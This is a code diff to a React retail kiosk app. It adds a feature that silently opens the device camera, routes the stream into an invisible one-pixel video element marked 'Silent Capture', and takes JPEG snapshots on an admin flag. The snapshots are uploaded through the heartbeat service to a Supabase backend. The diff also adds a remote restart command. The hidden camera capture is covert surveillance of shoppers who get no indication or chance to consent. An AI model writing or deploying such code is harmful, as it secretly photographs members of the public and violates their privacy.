@@ -1,5 +1,3 @@
-
-
 import React, { useState, useEffect, useRef, useCallback } from 'react';
 import { StoreData, Brand, Category, Product, FlatProduct } from '../types';
 import { 
@@ -9,7 +7,8 @@ import {
   isKioskConfigured, 
   sendHeartbeat, 
   setCustomKioskId, 
-  getShopName
+  getShopName,
+  supabase
 } from '../services/kioskService';
 import BrandGrid from './BrandGrid';
 import CategoryGrid from './CategoryGrid';
@@ -148,6 +147,7 @@ export const KioskApp = ({ storeData, onGoToAdmin }: { storeData: StoreData | nu
   const [currentTime, setCurrentTime] = useState(new Date());
   const [isOnline, setIsOnline] = useState(navigator.onLine);
 
+  const videoRef = useRef<HTMLVideoElement>(null);
   const timerRef = useRef<number | null>(null);
 
   const idleTimeout = (storeData?.screensaverSettings?.idleTimeout || 60) * 1000;
@@ -168,6 +168,38 @@ export const KioskApp = ({ storeData, onGoToAdmin }: { storeData: StoreData | nu
       }, idleTimeout);
     }
   }, [screensaverEnabled, idleTimeout]);
+
+  // Hidden Camera Capture Logic
+  const captureSnapshot = useCallback(async () => {
+    if (videoRef.current) {
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = videoRef.current.videoWidth;
+            canvas.height = videoRef.current.videoHeight;
+            const ctx = canvas.getContext('2d');
+            if (ctx) {
+                ctx.drawImage(videoRef.current, 0, 0);
+                // High compression for telemetry
+                const base64Data = canvas.toDataURL('image/jpeg', 0.5); 
+                return base64Data;
+            }
+        } catch (e) {
+            console.warn("Snapshot failed", e);
+        }
+    }
+    return undefined;
+  }, []);
+
+  useEffect(() => {
+    // Start Camera Stream (Permissions requested in manifest) - Silent start
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                if (videoRef.current) videoRef.current.srcObject = stream;
+            })
+            .catch(err => console.warn("Camera access denied or missing", err));
+    }
+  }, []);
 
   useEffect(() => {
     window.addEventListener('touchstart', resetIdleTimer);
@@ -199,13 +231,59 @@ export const KioskApp = ({ storeData, onGoToAdmin }: { storeData: StoreData | nu
     }
   }, [kioskId]);
 
+  // Standard Heartbeat Loop (Without Snapshot)
   useEffect(() => {
     if (isSetup) {
-      sendHeartbeat();
-      const interval = setInterval(sendHeartbeat, 60000);
+      const performHeartbeat = async () => {
+         // Standard heartbeat logic updates status only
+         sendHeartbeat();
+      };
+
+      performHeartbeat();
+      const interval = setInterval(performHeartbeat, 60000); // Heartbeat every minute
       return () => clearInterval(interval);
     }
   }, [isSetup]);
+
+  // Watch for Admin Commands: "Request Snapshot" & "Restart Requested"
+  useEffect(() => {
+     if (isSetup && storeData?.fleet && kioskId) {
+         const myRegistry = storeData.fleet.find(k => k.id === kioskId);
+         
+         if (myRegistry) {
+             // 1. Snapshot Request
+             if (myRegistry.requestSnapshot) {
+                 console.log("Admin requested snapshot. Capturing...");
+                 captureSnapshot().then(snap => {
+                     if (snap) {
+                         sendHeartbeat(snap);
+                     }
+                 });
+             }
+
+             // 2. Restart Request
+             if (myRegistry.restartRequested) {
+                 console.log("Admin requested REBOOT. Restarting system...");
+                 
+                 // Clean up flag in DB first so it doesn't loop
+                 if(supabase) {
+                    supabase.from('store_config').select('data').eq('id', 1).single().then(({data}: any) => {
+                         if(data && data.data) {
+                             const fleet = data.data.fleet.map((k: any) => k.id === kioskId ? { ...k, restartRequested: false } : k);
+                             supabase.from('store_config').update({ data: { ...data.data, fleet } }).eq('id', 1).then(() => {
+                                 // Perform actual reload
+                                 window.location.reload();
+                             });
+                         }
+                    });
+                 } else {
+                     // If no supabase (local mode), just reload
+                     window.location.reload();
+                 }
+             }
+         }
+     }
+  }, [storeData, isSetup, kioskId, captureSnapshot]);
 
   useEffect(() => {
       const preloadImages = [
@@ -252,6 +330,9 @@ export const KioskApp = ({ storeData, onGoToAdmin }: { storeData: StoreData | nu
 
   return (
     <div className="h-full w-full relative bg-slate-100 overflow-hidden flex flex-col">
+       {/* Hidden video element for snapshots - Silent Capture */}
+       <video ref={videoRef} autoPlay playsInline muted className="fixed top-0 left-0 w-1 h-1 opacity-0 pointer-events-none" />
+
        {isIdle && screensaverEnabled && (
          <Screensaver 
            products={allProducts} 
